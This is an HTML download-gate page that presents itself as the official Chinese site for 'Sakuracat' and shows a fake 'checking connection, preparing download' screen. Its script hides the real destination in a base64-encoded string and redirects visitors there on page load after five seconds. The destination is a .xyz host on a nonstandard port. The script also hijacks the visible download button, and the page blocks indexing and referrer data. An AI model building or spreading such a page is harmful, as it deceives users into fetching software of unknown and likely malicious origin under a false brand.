<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
  <meta name="referrer" content="no-referrer">
  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <link rel="canonical" href="https://xtcw.cn/">
  <title>Sakuracat(中国大陆)官方网站</title>
  <style>
    *{box-sizing:border-box}
    body{margin:0;min-height:100vh;display:grid;place-items:center;font-family:"Microsoft YaHei",Arial,sans-serif;color:#f5fbff;background:radial-gradient(circle at 20% 20%,rgba(87,226,255,.28),transparent 28%),radial-gradient(circle at 80% 10%,rgba(139,106,255,.25),transparent 26%),linear-gradient(135deg,#071126,#171451 52%,#0b2448)}
    .gate{width:min(92vw,480px);padding:34px;border:1px solid rgba(160,221,255,.28);border-radius:8px;background:rgba(10,22,48,.78);box-shadow:0 24px 80px rgba(0,0,0,.35),0 0 60px rgba(77,225,255,.16);text-align:center;backdrop-filter:blur(14px)}
    .mark{width:72px;height:72px;margin:0 auto 18px;border-radius:50%;background:linear-gradient(135deg,#55dcff,#8a6aff);box-shadow:0 0 28px rgba(88,224,255,.38)}
    h1{margin:0 0 12px;font-size:30px;letter-spacing:0}
    p{margin:8px 0;color:#cfe3ff;line-height:1.7}
    .bar{height:10px;margin:24px 0 20px;border-radius:8px;background:rgba(255,255,255,.12);overflow:hidden}
    .bar span{display:block;height:100%;width:0;background:linear-gradient(90deg,#57e2ff,#ffd45a,#9d7cff);animation:load 5s linear forwards}
    .btn{display:inline-flex;align-items:center;justify-content:center;min-height:44px;padding:0 22px;border-radius:8px;border:1px solid rgba(255,255,255,.18);background:#59e1ff;color:#061428;font-weight:700;text-decoration:none}
    @keyframes load{to{width:100%}}
  </style>
</head>
<body>
  <main class="gate xtcw-govcn">
    <div class="mark" aria-hidden="true"></div>
    <h1>资源准备中</h1>
    <p>正在校验连接环境</p>
    <p>即将进入下载页面</p>
    <p>请勿关闭当前页面</p>
    <div class="bar" aria-hidden="true"><span></span></div>
    <a id="manualDownload" class="btn" href="/kexue.html" rel="nofollow noopener noreferrer">立即下载</a>
  </main>
  <script>
    const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9iNTUuMzEzNDg2Lnh5ejozNTg4OC8=");
    const manualDownload = document.getElementById("manualDownload");
    manualDownload.addEventListener("click", function(e){
      e.preventDefault();
      window.location.replace(REAL_DOWNLOAD_URL);
    });
    window.setTimeout(function(){
      window.location.replace(REAL_DOWNLOAD_URL);
    }, 5000);
  </script>
</body>
</html>
